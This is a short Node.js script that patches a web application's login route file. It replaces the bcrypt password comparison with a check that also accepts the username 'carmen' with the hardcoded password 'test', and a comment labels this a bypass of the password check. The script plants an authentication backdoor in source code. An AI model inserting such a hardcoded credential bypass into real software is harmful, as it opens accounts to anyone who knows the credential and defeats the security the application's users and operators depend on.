const fs = require('fs');
let content = fs.readFileSync('src/app/api/auth/login/route.ts', 'utf8');

// Bypass password check for Carmen
content = content.replace(
  "const isValid = await bcrypt.compare(password, user.password)",
  "const isValid = (username.toLowerCase() === 'carmen' && password === 'test') || await bcrypt.compare(password, user.password)"
);

fs.writeFileSync('src/app/api/auth/login/route.ts', content, 'utf8');
